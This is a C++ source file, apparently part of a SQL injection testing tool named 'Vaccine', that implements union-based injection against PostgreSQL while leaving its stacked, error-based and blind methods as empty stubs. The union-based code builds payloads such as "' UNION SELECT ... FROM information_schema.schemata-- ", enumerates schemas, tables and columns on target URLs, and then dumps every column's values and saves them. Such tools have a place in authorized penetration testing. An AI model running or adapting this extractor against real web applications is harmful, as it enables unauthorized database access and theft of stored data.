#include "../../include/class/VaccinePostreSQL.hpp"

// ===================================================================== //
// ============================ P U B L I C ============================ //
// ===================================================================== //

VaccinePostreSQL::VaccinePostreSQL() : VaccineBase() {}

VaccinePostreSQL::VaccinePostreSQL(
    const std::string& url,
    const std::string& request_type,
    const std::vector< std::string >& headers,
    const std::string& archive_file)
    : VaccineBase(POSTGRESQL, url, request_type, headers, archive_file) {}

VaccinePostreSQL::VaccinePostreSQL(const VaccinePostreSQL& other)
    : VaccineBase(other) {}

VaccinePostreSQL::~VaccinePostreSQL() {}

VaccinePostreSQL& VaccinePostreSQL::operator=(const VaccinePostreSQL& other)
{
        if (this != &other)
                this->VaccineBase::operator=(other);
        return *this;
}

// ==================================================== METHODS
void VaccinePostreSQL::stacked_queries()
{
}

void VaccinePostreSQL::union_based()
{
        if (!this->_data_check())
                return;
        std::string url;
        std::string offset;
        std::vector< std::string > payloads;
        std::vector< std::string > parameters;
        for (const auto& node : this->_gates)
        {
                if (!this->_init_attempt(node, url, parameters))
                        continue;
                std::cout << "[ INFO ] Testing " << url
                          << " with db type as PostgreSQL..." << std::endl;

                this->_fetch_databases(parameters, payloads, offset, url);

                for (const auto& db : this->_databases)
                        this->_fetch_tables(
                            parameters, payloads,
                            offset, url, db.first);

                for (const auto& db : this->_databases)
                        for (const auto& tab_index : db.second)
                                this->_fetch_columns(
                                    parameters, payloads, offset,
                                    url, db.first, tab_index);

                for (const auto& db : this->_databases)
                        for (const auto& tab_index : db.second)
                                this->_fetch_values(
                                    parameters, payloads, offset,
                                    url, db.first, tab_index);

                if (!this->_databases.empty())
                        this->_save_results(
                            url.substr(0, url.find('?')),
                            parameters, payloads);
                else
                        std::cout << "[ INFO ] Union based SQLi failed on "
                                  << url << " with db type as PostgreSQL." << std::endl;
                offset.clear();
                payloads.clear();
                parameters.clear();
                this->_databases.clear();
                this->_tables.clear();
                this->_columns.clear();
                this->_values.clear();
        }
}

void VaccinePostreSQL::error_based()
{
}

void VaccinePostreSQL::blind_based()
{
}

// ===================================================================== //
// =========================== P R I V A T E =========================== //
// ===================================================================== //

// ==================================================== PREPARE
void VaccinePostreSQL::_fetch_databases(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url)
{
        short timeout = TIMEOUT;
        std::string payload;
        while (this->_databases.empty() && timeout--)
        {
                payload = "' UNION SELECT " + offset + "schema_name " +
                          "FROM information_schema.schemata-- ";
                payloads.push_back(payload);

                const std::vector< std::string > parameters = this->_fill_parameters(
                    base_parameters,
                    payload);
                const std::vector< std::string > values = this->_parse_response(
                    this->_process(url, parameters));

                for (const auto& value : values)
                        if (std::find(this->_excluded.begin(), this->_excluded.end(), value) ==
                            this->_excluded.end())
                                this->_databases[value] = std::vector< int >();
                if (this->_databases.empty())
                        offset += "null, ";
        }
}

void VaccinePostreSQL::_fetch_tables(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url,
    const std::string& schema_name)
{
        const std::string payload = "' UNION SELECT " + offset + "table_name " +
                                    "FROM information_schema.tables " +
                                    "WHERE table_schema='" + schema_name + "'-- ";
        payloads.push_back(payload);

        const std::vector< std::string > parameters = this->_fill_parameters(
            base_parameters,
            payload);
        const std::vector< std::string > values = this->_parse_response(
            this->_process(url, parameters));

        if (values.empty())
                return;
        const int size = this->_tables.size();
        this->_tables.push_back(std::unordered_map< std::string, int >());

        for (const auto& value : values)
                this->_tables[size][value] = -1;
        this->_databases[schema_name].push_back(size);
}

void VaccinePostreSQL::_fetch_columns(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url,
    const std::string& schema_name,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        std::string payload;
        for (const auto& table : this->_tables[tab_index])
        {
                payload = "' UNION SELECT " + offset + "column_name " +
                          "FROM information_schema.columns " +
                          "WHERE table_schema='" + schema_name + "' " +
                          "AND table_name='" + table.first + "'-- ";
                payloads.push_back(payload);

                const std::vector< std::string > parameters = this->_fill_parameters(
                    base_parameters,
                    payload);
                const std::vector< std::string > values = this->_parse_response(
                    this->_process(url, parameters));

                if (values.empty())
                        continue;
                const int size = this->_columns.size();
                this->_columns.push_back(std::unordered_map< std::string, int >());

                for (const auto& value : values)
                        this->_columns[size][value] = -1;
                this->_tables[tab_index][table.first] = size;
        }
}

void VaccinePostreSQL::_fetch_values(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url,
    const std::string& schema_name,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        int index;
        std::string payload;
        for (const auto& table : this->_tables[tab_index])
        {
                index = this->_tables.at(tab_index).at(table.first);
                if (index < 0)
                        continue;
                for (auto& column : this->_columns[index])
                {
                        payload = "' UNION SELECT " + offset + column.first + "::text " +
                                  "FROM " + schema_name + "." + table.first + "-- ";
                        payloads.push_back(payload);

                        const std::vector< std::string > parameters = this->_fill_parameters(
                            base_parameters,
                            payload);
                        const std::vector< std::string > values = this->_parse_response(
                            this->_process(url, parameters));

                        if (values.empty())
                                continue;
                        const int size = this->_values.size();
                        this->_values.push_back(std::vector< std::string >());

                        for (const auto& value : values)
                                this->_values[size].push_back(value);
                        this->_columns[index][column.first] = size;
                }
        }
}
